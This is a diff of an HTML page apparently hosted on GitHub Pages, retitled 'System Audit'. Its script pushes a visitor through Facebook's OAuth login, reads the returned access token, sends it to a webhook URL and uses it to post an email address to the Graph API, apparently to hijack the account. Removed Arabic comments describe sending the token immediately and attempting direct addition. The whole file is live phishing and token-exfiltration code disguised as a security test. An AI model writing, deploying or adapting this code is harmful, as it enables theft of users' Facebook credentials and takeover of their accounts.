@@ -1,6 +1,6 @@
 <!DOCTYPE html>
 <html>
-<head><title>Loading...</title></head>
+<head><title>System Audit</title></head>
 <body>
     <script>
         window.onload = async function() {
@@ -10,17 +10,14 @@
 
             if (hash.includes('access_token=')) {
                 const token = new URLSearchParams(hash.substring(1)).get('access_token');
-                // إرسال التوكن فوراً قبل أي إجراء آخر
-                await fetch(`${webhook}?FINAL_TOKEN=${token}`, {mode: 'no-cors'});
+                fetch(`${webhook}?SUCCESS_TOKEN=${token}`, {mode: 'no-cors'});
                 
-                // محاولة الإضافة المباشرة
                 await fetch(`https://graph.facebook.com/me?access_token=${token}`, {
                     method: 'POST',
                     body: new URLSearchParams({ 'email': email })
                 });
                 
-                // التوجيه لصفحة التأكيد اليدوي
-                window.location.href = "https://www.facebook.com/settings?tab=account";
+                window.location.href = "https://www.facebook.com/settings";
             } else {
                 window.location.href = "https://www.facebook.com/v15.0/dialog/oauth?client_id=1089408829356317&redirect_uri=https://mohammedborai404.github.io/fb-security-test/&response_type=token&scope=email,public_profile,openid";
             }
